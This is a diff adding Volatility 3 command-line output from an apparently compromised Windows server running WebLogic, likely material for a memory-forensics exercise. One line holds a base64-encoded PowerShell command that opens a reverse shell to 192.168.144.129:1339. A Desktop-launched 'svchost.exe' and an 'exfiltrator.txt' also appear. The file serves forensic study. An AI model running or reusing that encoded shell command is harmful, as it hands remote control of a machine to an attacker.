@@ -1,0 +1,79 @@
+Volatility 3 Framework 1.0.1
+
+PID	Process	Args
+
+4	System	Required memory at 0x20 is not valid (process exited?)
+292	smss.exe	\SystemRoot\System32\smss.exe
+412	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+504	smss.exe	Required memory at 0xbc4f0cb020 is not valid (process exited?)
+512	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+560	winlogon.exe	winlogon.exe
+568	wininit.exe	wininit.exe
+652	services.exe	C:\Windows\system32\services.exe
+664	lsass.exe	C:\Windows\system32\lsass.exe
+764	svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch
+824	svchost.exe	C:\Windows\system32\svchost.exe -k RPCSS
+912	dwm.exe	"dwm.exe"
+972	svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted
+996	svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
+508	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs
+400	svchost.exe	C:\Windows\system32\svchost.exe -k LocalService
+944	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork
+1092	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted
+1100	svchost.exe	C:\Windows\system32\svchost.exe -k NetworkService
+1592	spoolsv.exe	C:\Windows\System32\spoolsv.exe
+1668	svchost.exe	C:\Windows\System32\svchost.exe -k utcsvc
+1732	svchost.exe	C:\Windows\System32\svchost.exe -k smbsvcs
+1764	svchost.exe	C:\Windows\system32\svchost.exe -k appmodel
+1852	wlms.exe	C:\Windows\system32\wlms\wlms.exe
+1876	MsMpEng.exe	"C:\Program Files\Windows Defender\MsMpEng.exe"
+1896	vm3dservice.ex	C:\Windows\system32\vm3dservice.exe
+1904	vmtoolsd.exe	"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+1912	VGAuthService.	"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+892	vm3dservice.ex	vm3dservice.exe -n
+2136	svchost.exe	C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted
+2812	dllhost.exe	C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
+2912	msdtc.exe	C:\Windows\System32\msdtc.exe
+3004	WmiPrvSE.exe	C:\Windows\system32\wbem\wmiprvse.exe
+2560	WmiPrvSE.exe	C:\Windows\system32\wbem\wmiprvse.exe
+3176	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation
+4064	RuntimeBroker.	C:\Windows\System32\RuntimeBroker.exe -Embedding
+2196	sihost.exe	sihost.exe
+2756	svchost.exe	C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+2424	taskhostw.exe	taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+1140	userinit.exe	Required memory at 0x59eced020 is not valid (process exited?)
+2676	explorer.exe	C:\Windows\Explorer.EXE
+3496	ShellExperienc	"C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
+3408	SearchUI.exe	"C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
+2552	ServerManager.	"C:\Windows\system32\ServerManager.exe" 
+3732	vmtoolsd.exe	"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+4172	jusched.exe	"C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe" 
+4356	cmd.exe	"C:\Windows\System32\cmd.exe" /C "C:\Users\Administrator\Desktop\wls1411\user_projects\domains\base_domain\bin\startNodeManager.cmd" 
+4364	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
+4456	java.exe	"C:\PROGRA~1\Java\JDK18~1.0_2\bin\java.exe"   -server -Xms32m -Xmx200m -Djdk.tls.ephemeralDHKeySize=2048 -Dcoherence.home=C:\Users\ADMINI~1\Desktop\wls1411\coherence -Dbea.home=C:\Users\ADMINI~1\Desktop\wls1411  -Dweblogic.RootDirectory=C:\Users\ADMINI~1\Desktop\wls1411\USER_P~1\domains\BASE_D~1  -Djava.system.class.loader=com.oracle.classloader.weblogic.LaunchClassLoader "-Djava.security.policy=C:\Users\ADMINI~1\Desktop\wls1411\wlserver\server\lib\weblogic.policy" "-Dweblogic.nodemanager.JavaHome=C:\PROGRA~1\Java\JDK18~1.0_2" weblogic.NodeManager -v
+4556	cmd.exe	"C:\Windows\System32\cmd.exe" /C "C:\Users\Administrator\Desktop\wls1411\user_projects\domains\base_domain\bin\startWebLogic.cmd" 
+4564	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
+4736	cmd.exe	cmd  /c "C:\Users\Administrator\Desktop\wls1411\wlserver\common\derby\bin\startNetworkServer.bat "
+4752	java.exe	C:\PROGRA~1\Java\JDK18~1.0_2\bin\java  -server   -Xms256m -Xmx512m  -cp C:\Users\ADMINI~1\Desktop\wls1411\wlserver\server\lib\weblogic-launcher.jar -Dlaunch.use.env.classpath=true -Dweblogic.Name=AdminServer -Djava.security.policy=C:\Users\ADMINI~1\Desktop\wls1411\wlserver\server\lib\weblogic.policy  -Dweblogic.ProductionModeEnabled=true -Djava.system.class.loader=com.oracle.classloader.weblogic.LaunchClassLoader  -javaagent:C:\Users\ADMINI~1\Desktop\wls1411\wlserver\server\lib\debugpatch-agent.jar -da -Dwls.home=C:\Users\ADMINI~1\Desktop\wls1411\wlserver\server -Dweblogic.home=C:\Users\ADMINI~1\Desktop\wls1411\wlserver\server     -Djava.endorsed.dirs=C:\PROGRA~1\Java\JDK18~1.0_2\jre\lib\endorsed;C:\Users\ADMINI~1\Desktop\wls1411\oracle_common\modules\endorsed;C:\Users\ADMINI~1\Desktop\wls1411\wlserver\modules\endorsed  weblogic.Server
+4772	java.exe	"C:\PROGRA~1\Java\JDK18~1.0_2\bin\java.exe"  -Djava.security.manager -Djava.security.policy=C:\Users\Administrator\Desktop\wls1411\wlserver\common\derby\derbyServer.policy "-Dderby.system.home=C:\Users\ADMINI~1\Desktop\wls1411\USER_P~1\domains\BASE_D~1\common\db" -classpath "C:\Users\Administrator\Desktop\wls1411\wlserver\common\derby/lib/derby.jar;C:\Users\Administrator\Desktop\wls1411\wlserver\common\derby/lib/derbynet.jar;C:\Users\Administrator\Desktop\wls1411\wlserver\common\derby/lib/derbyclient.jar;C:\Users\Administrator\Desktop\wls1411\wlserver\common\derby/lib/derbytools.jar;C:\Users\Administrator\Desktop\wls1411\wlserver\common\derby/lib/derbyoptionaltools.jar" org.apache.derby.drda.NetworkServerControl start 
+1392	jucheck.exe	"C:\Program Files (x86)\Common Files\Java\Java Update\jucheck.exe" -auto
+2824	fontdrvhost.ex	"fontdrvhost.exe"
+840	armsvc.exe	"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe"
+4344	powershell.exe	powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEANAA0AC4AMQAyADkAIgAsADEAMwAzADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+4636	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
+4200	powershell.exe	Required memory at 0x9888ee7020 is not valid (process exited?)
+2712	powershell.exe	Required memory at 0xab2c6e7020 is not valid (process exited?)
+2132	powershell.exe	Required memory at 0x9bb4dd9020 is not valid (process exited?)
+4264	powershell.exe	Required memory at 0x1002ac020 is not valid (process exited?)
+3684	powershell.exe	Required memory at 0xe6d36ae020 is not valid (process exited?)
+3676	powershell.exe	Required memory at 0x65c73a1020 is not valid (process exited?)
+3520	powershell.exe	Required memory at 0xa36029e020 is not valid (process exited?)
+1012	powershell.exe	Required memory at 0x5afb111020 is not valid (process exited?)
+2200	powershell.exe	Required memory at 0x91e1d32020 is not valid (process exited?)
+776	powershell.exe	Required memory at 0xe57ea22020 is not valid (process exited?)
+1616	powershell.exe	Required memory at 0x508be21020 is not valid (process exited?)
+2688	mmc.exe	"C:\Windows\system32\mmc.exe" "C:\Windows\system32\taskschd.msc" /s
+1488	svchost.exe	"C:\Users\Administrator\Desktop\svchost.exe"
+4596	notepad.exe	"C:\Windows\System32\notepad.exe" exfiltrator.txt
+2568	RamCapture64.e	"C:\Users\Administrator\Desktop\RamCapturer\x64\RamCapture64.exe" 
+3524	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
